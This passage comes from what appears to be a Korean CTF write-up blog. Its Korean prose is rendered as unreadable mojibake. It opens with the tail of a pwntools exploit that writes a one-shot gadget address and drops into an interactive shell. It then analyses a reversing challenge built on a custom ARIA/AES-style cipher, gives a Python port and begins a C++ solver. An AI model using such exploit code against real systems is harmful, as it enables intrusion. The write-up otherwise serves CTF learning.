    <span class="n">write</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">rsi</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">oneshot</span><span class="p">)</span>

    <span class="n">re</span><span class="p">()</span>

    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="k">break</span>
</pre></table></code></div></div><h2 id="f-unconventional---reversing">F. Unconventional - Reversing<a href="#f-unconventional---reversing" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>raxì™€ rspì˜ ì—­í• ì´ ë°”ë€ í‰í–‰ì„¸ê³„ì˜ ë°”ì´ë„ˆë¦¬ë¥¼ ì»¨ì…‰ìœ¼ë¡œ í•œ ë¬¸ì œì´ë‹¤.</p><p>raxë¥¼ í†µí•´ push, popí•˜ëŠ” ê³¼ì •ê³¼ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ê³¼ì •ì´ ì–¼í• ìƒê°í•˜ë©´ ë‹¹ì—°í•˜ì§€ë§Œ ì°¸ì‹ í•˜ê³  ì¬ë¯¸ìˆê²Œ ëŠê»´ì¡Œë‹¤.</p><p>ì¼ë‹¨ ë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•´ë³´ë©´ í¬ê¸°ê°€ í¬ì§€ ì•Šê¸° ë•Œë¬¸ì—<br /> ì–´ë µì§€ ì•Šê²Œ ì–´ë– í•œ ë£¨í‹´ì„ ê°–ê³  ë™ì‘í•˜ëŠ”ì§€ ì•Œ ìˆ˜ ìˆì—ˆë‹¤.</p><p>fgetsë¥¼ í†µí•´ ê¸¸ì´ê°€ 48ì¸ ì…ë ¥ì„ ë°›ê³ , ì…ë ¥ì„ ê¸¸ì´ê°€ 16ì¸ ë¸”ë¡ìœ¼ë¡œ ìª¼ê°œì„œ ì—°ì‚°í•œë‹¤.</p><p>ì—°ì‚°ì€ xë¼ê³  ì„ì˜ë¡œ ì •ì˜í•œ <code class="language-plaintext highlighter-rouge">[0x21, 0xE5, 0x88, 0xAC, 0xBB, 0xB0, 0x97, 0xEA, 0x16, 0x42, 0x03, 0x0B, 0x9B, 0xD2, 0x5C, 0x6C]</code> ê°’ê³¼ í•¨ê»˜ ì§„í–‰ëœë‹¤.</p><p>ê° ë¸”ë¡ë³„ë¡œ 0xC0FF33ë²ˆ ì—°ì‚°ì„ ë°˜ë³µí•˜ëŠ”ë°, ì—°ì‚°ì˜ ê³¼ì •ì€ ì•„ë˜ì™€ ê°™ì•˜ë‹¤.</p><ol><li>ë¸”ëŸ­ì„ ARIAì˜ 2ë²ˆì§¸ sboxë¡œ <code class="language-plaintext highlighter-rouge">substitute</code><li>ë¸”ëŸ­ì„ AES ë°©ì‹ìœ¼ë¡œ <code class="language-plaintext highlighter-rouge">shift row</code><li><code class="language-plaintext highlighter-rouge">[0x03, 0x0C, 0x0B, 0x05, 0x08, 0x04, 0x07, 0x0D, 0x0F, 0x00, 0x06, 0x0E, 0x09, 0x01, 0x0A, 0x02]</code>ì„ ì´ìš©í•˜ì—¬ ë¸”ëŸ­ì—ë‹¤ê°€ xor, add, rol<li>xì™€ ë¸”ë¡ì„ xor<li>xì—ë‹¤ê°€ 1 ~ 3 ì—°ì‚°</ol><p>ì´ë¥¼ ëŒ€ì¶© íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ë¡œ ë³€í™˜í•˜ë©´ ì•„ë˜ì™€ ê°™ì•˜ë‹¤.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span> <span class="c1"># progress bar
</span><span class="n">x</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">]</span>
<span class="n">comp</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">]</span>
<span class="n">sbox</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">]</span>
<span class="n">g</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x91</span><span class="p">,</span><span class="mh">0xd7</span><span class="p">,</span><span class="mh">0x36</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0xb1</span><span class="p">,</span><span class="mh">0x36</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0xd7</span><span class="p">,</span><span class="mh">0xce</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0xd7</span><span class="p">,</span><span class="mh">0x36</span><span class="p">,</span><span class="mh">0xd9</span><span class="p">]</span>
<span class="n">p</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">]</span>

<span class="n">a</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">comp</span><span class="p">)[:</span><span class="mi">16</span><span class="p">]</span>
<span class="n">r</span> <span class="o">=</span> <span class="mh">0xC0FF33</span>

<span class="k">def</span> <span class="nf">rol</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">n</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">((</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">n</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>

<span class="k">def</span> <span class="nf">sub</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="n">t</span> <span class="o">=</span> <span class="p">[</span><span class="n">sbox</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">a</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">a</span>

<span class="k">def</span> <span class="nf">shift_row</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">],</span><span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">],</span><span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">12</span><span class="p">]</span><span class="o">=</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">],</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">],</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">],</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">a</span>

<span class="k">def</span> <span class="nf">enc</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">^=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">|</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">a</span><span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span> <span class="o">+=</span> <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
        <span class="n">a</span><span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">],</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">&amp;</span><span class="mi">7</span><span class="p">)</span>
        <span class="n">x</span><span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">a</span>

<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">a</span>


<span class="n">a</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="sa">b</span><span class="s">'zxcvasdfqwer1234'</span><span class="p">)</span>

<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">r</span><span class="p">)):</span>
    <span class="n">sub</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">shift_row</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">enc</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">xor</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>

    <span class="n">sub</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
    <span class="n">shift_row</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
    <span class="n">enc</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">a</span><span class="p">).</span><span class="nb">hex</span><span class="p">(</span><span class="n">sep</span><span class="o">=</span><span class="s">' '</span><span class="p">))</span>
</pre></table></code></div></div><p>íŒŒì´ì¬ì„ ì´ìš©í•´ì„œ ì½”ë“œë¥¼ í¬íŒ…í•´ì„œ ì²˜ìŒì—ëŠ” íŒŒì´ì¬ìœ¼ë¡œ ì—­ì—°ì‚° í•˜ë ¤ê³  í–ˆì§€ë§Œ<br /> ì—°ì‚° ì†ë„ê°€ ë„ˆë¬´ ëŠë ¤ì„œ C++ë¡œ ì—­ì—°ì‚° ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì˜€ë‹¤.</p><blockquote><p>Solution Script</p></blockquote><div class="language-c++ highlighter-rouge"><div class="code-header"> <span label-text="C++"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;iostream&gt;
</span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
